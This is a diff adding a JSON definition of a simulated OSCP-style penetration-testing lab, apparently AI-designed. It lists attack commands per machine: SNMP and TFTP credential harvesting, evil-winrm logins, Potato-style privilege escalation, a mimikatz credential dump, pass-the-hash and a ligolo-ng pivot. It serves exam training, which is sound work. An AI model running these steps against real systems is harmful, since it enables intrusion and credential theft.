@@ -1,0 +1,181 @@
+{
+  "id": "the-quiet-network",
+  "title": "The Quiet Network",
+  "category": "exam-simulation",
+  "source": ["AI-designed"],
+  "designed_by": "ai-composite",
+  "description": "All entry points require UDP recon. TCP scans show nothing useful. SNMP, TFTP, DNS zone transfer are the keys. AD: MS01 (SNMP → creds → WinRM), MS02 (TFTP → config → creds), DC01. Standalone: BOX1 (DNS zone transfer → hidden subdomain), BOX2 (SNMP → service discovery), BOX3 (UDP service on high port).",
+
+  "introduction": "When TCP is quiet, UDP holds the keys—SNMP, TFTP, DNS. This scenario trains you to enumerate UDP and find hidden entry points.",
+  "mental_model": "Think: TCP empty = try UDP. SNMP leaks creds; TFTP has configs; DNS zone transfer reveals hidden hosts.",
+  "key_principles": [
+    "nmap -sU for UDP when TCP shows nothing",
+    "snmpwalk with public/private community",
+    "TFTP get for config files",
+    "dig axfr for zone transfer",
+    "UDP high ports may have custom services"
+  ],
+
+  "indicators": {
+    "difficulty": 6,
+    "cognitive_load": 5,
+    "enumeration_depth": 9,
+    "rabbit_hole_risk": 5,
+    "time_pressure": 6
+  },
+
+  "mitre": {
+    "tactics": ["TA0001", "TA0003", "TA0004", "TA0006", "TA0007"],
+    "techniques": [
+      {"id": "T1046", "name": "Network Service Discovery"},
+      {"id": "T1087.002", "name": "Account Discovery: Domain Account"},
+      {"id": "T1552.001", "name": "Credentials In Files"},
+      {"id": "T1021.006", "name": "Windows Remote Management"}
+    ]
+  },
+
+  "kill_chain_phases": ["T1-Recon", "T3-NonWeb-Access", "T4a-Linux-PrivEsc", "T4b-Win-PrivEsc", "T5-Credentials", "T6-Pivoting", "T7-Lateral"],
+
+  "environment": {
+    "machine_count": 6,
+    "network_count": 2,
+    "os_distribution": {"windows": 3, "linux": 3},
+    "has_ad": true,
+    "has_pivoting": true,
+    "has_client_side": false
+  },
+
+  "technique_tags": [
+    "udp", "snmp", "tftp", "dns", "zone-transfer",
+    "nmap", "snmpwalk", "evil-winrm", "ligolo-ng"
+  ],
+
+  "exam_relevance": {
+    "oscp_exam_format": true,
+    "pen200_modules": [6, 12, 16, 17, 18, 22],
+    "pattern_frequency": "medium",
+    "recommended_order": 12
+  },
+
+  "prerequisites": [],
+  "builds_on": [],
+
+  "networks": [
+    {"id": "external", "cidr": "192.168.20.0/24", "label": "External"},
+    {"id": "internal", "cidr": "10.10.30.0/24", "label": "AD Internal"}
+  ],
+
+  "machines": [
+    {
+      "id": "ms01",
+      "label": "MS01",
+      "ip": "192.168.20.10",
+      "os": "Windows",
+      "role": "AD Entry (dual-NIC)",
+      "networks": ["external", "internal"],
+      "services": [
+        {"port": 161, "name": "SNMP", "version": "UDP", "vulnerabilities": [{"type": "info-disclosure", "summary": "SNMP walk → creds in MIB", "leads_to": "winrm"}], "commands": ["nmap -sU -p 161 192.168.20.10", "snmpwalk -v2c -c public 192.168.20.10"]},
+        {"port": 5985, "name": "WinRM", "version": "", "vulnerabilities": [{"type": "auth", "summary": "WinRM with SNMP creds", "leads_to": "local-user"}], "commands": ["evil-winrm -i 192.168.20.10 -u svc_snmp -p '<from-snmp>'"]}
+      ],
+      "privesc": [{"from": "svc_snmp", "to": "SYSTEM", "technique": "PrintSpoofer", "commands": ["PrintSpoofer64.exe -i -c cmd"]}],
+      "credentials": [{"user": "svc_snmp", "type": "password", "source": "SNMP extended MIB", "unlocks": ["ms01-winrm"]}],
+      "alternatives": []
+    },
+    {
+      "id": "ms02",
+      "label": "MS02",
+      "ip": "10.10.30.11",
+      "os": "Windows",
+      "role": "AD Member",
+      "networks": ["internal"],
+      "services": [
+        {"port": 69, "name": "TFTP", "version": "UDP", "vulnerabilities": [{"type": "info-disclosure", "summary": "TFTP config files → creds", "leads_to": "admin"}], "commands": [{"cmd": "tftp 10.10.30.11 get config.ini", "rationale": "Why: TFTP often has unauthenticated config files"}, "cat config.ini"]},
+        {"port": 5985, "name": "WinRM", "version": "", "vulnerabilities": [{"type": "auth", "summary": "WinRM with TFTP creds", "leads_to": "local-user"}], "commands": ["evil-winrm -i 10.10.30.11 -u admin -p '<from-tftp>'"]}
+      ],
+      "privesc": [{"from": "admin", "to": "SYSTEM", "technique": "GodPotato", "commands": ["GodPotato-NET4.exe -cmd \"cmd /c whoami\""]}],
+      "credentials": [{"user": "admin", "type": "password", "source": "TFTP config.ini", "unlocks": ["dc01"]}],
+      "alternatives": []
+    },
+    {
+      "id": "dc01",
+      "label": "DC01",
+      "ip": "10.10.30.5",
+      "os": "Windows",
+      "role": "Domain Controller",
+      "networks": ["internal"],
+      "services": [
+        {"port": 5985, "name": "WinRM", "version": "", "vulnerabilities": [{"type": "auth", "summary": "WinRM with admin hash", "leads_to": "domain-admin"}], "commands": ["evil-winrm -i 10.10.30.5 -u Administrator -H '<hash>'"]},
+        {"port": 53, "name": "DNS", "version": "", "vulnerabilities": [{"type": "auth", "summary": "DNS zone transfer", "leads_to": "recon"}], "commands": ["dig axfr @10.10.30.5 corp.local"]}
+      ],
+      "privesc": [],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "box1",
+      "label": "BOX1",
+      "ip": "192.168.20.20",
+      "os": "Linux",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 53, "name": "DNS", "version": "", "vulnerabilities": [{"type": "misconfig", "summary": "DNS zone transfer → hidden subdomain", "leads_to": "web"}], "commands": [{"cmd": "dig axfr @192.168.20.20 internal.local", "rationale": "Why: Zone transfer reveals hidden subdomains"}, "curl http://admin.internal.local"]},
+        {"port": 80, "name": "HTTP", "version": "", "vulnerabilities": [{"type": "auth", "summary": "Hidden vhost from zone transfer", "leads_to": "rce"}], "commands": []}
+      ],
+      "privesc": [{"from": "www-data", "to": "root", "technique": "SUID", "commands": ["find / -perm -4000 2>/dev/null"]}],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "box2",
+      "label": "BOX2",
+      "ip": "192.168.20.21",
+      "os": "Linux",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 161, "name": "SNMP", "version": "UDP", "vulnerabilities": [{"type": "info-disclosure", "summary": "SNMP → service discovery", "leads_to": "exploit"}], "commands": ["snmpwalk -v2c -c public 192.168.20.21 NET-SNMP-EXTEND-MIB::nsExtendObjects"]},
+        {"port": 22, "name": "SSH", "version": "", "vulnerabilities": [{"type": "auth", "summary": "SSH with SNMP creds", "leads_to": "local-user"}], "commands": ["ssh dev@192.168.20.21"]}
+      ],
+      "privesc": [{"from": "dev", "to": "root", "technique": "sudo", "commands": ["sudo -l"]}],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "box3",
+      "label": "BOX3",
+      "ip": "192.168.20.22",
+      "os": "Linux",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 49152, "name": "Custom UDP", "version": "UDP", "vulnerabilities": [{"type": "rce", "summary": "UDP service on high port", "leads_to": "local-user"}], "commands": ["nmap -sU -p 49152 192.168.20.22", "nc -u 192.168.20.22 49152"]},
+        {"port": 22, "name": "SSH", "version": "", "vulnerabilities": [{"type": "auth", "summary": "SSH after UDP exploit", "leads_to": "local-user"}], "commands": []}
+      ],
+      "privesc": [{"from": "user", "to": "root", "technique": "Cron", "commands": ["cat /etc/crontab"]}],
+      "credentials": [],
+      "alternatives": []
+    }
+  ],
+
+  "connections": [
+    {"from": "ms01", "to": "ms02", "technique": "Ligolo-ng pivot to internal", "requires": "SYSTEM on MS01 (dual-NIC)", "pivot": "MS01 dual-NIC", "path_ids": ["path-ad"], "commands": [
+      {"cmd": "ligolo-ng agent -connect <kali>:11601 -ignore-cert", "rationale": "Why: Pivot to internal for TFTP and DC"},
+      "# On Kali proxy: session → ifconfig → ip route add 10.10.30.0/24 dev ligolo",
+      "tftp 10.10.30.11 get config.ini",
+      "cat config.ini",
+      "evil-winrm -i 10.10.30.11 -u admin -p '<from-tftp>'"
+    ]},
+    {"from": "ms02", "to": "dc01", "technique": "Pass-the-Hash with admin NTLM", "requires": "Admin hash from Mimikatz/secretsdump on MS02", "pivot": "MS01", "path_ids": ["path-ad"], "commands": [
+      "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
+      "evil-winrm -i 10.10.30.5 -u Administrator -H '<ntlm_hash>'"
+    ]}
+  ],
+
+  "attack_paths": [
+    {"id": "path-ad", "name": "AD: SNMP → TFTP → DC", "color": "#6bb8cc", "steps": ["ms01", "ms02", "dc01"], "description": "MS01 SNMP → creds → WinRM → MS02 TFTP → config → DC01"},
+    {"id": "path-box1", "name": "BOX1: DNS Zone Transfer", "color": "#e8a87c", "steps": ["box1"], "description": "DNS zone transfer → hidden subdomain → web"},
+    {"id": "path-box2", "name": "BOX2: SNMP Discovery", "color": "#85e89d", "steps": ["box2"], "description": "SNMP → service discovery → creds"},
+    {"id": "path-box3", "name": "BOX3: UDP High Port", "color": "#d2a8ff", "steps": ["box3"], "description": "UDP service on high port"}
+  ]
+}
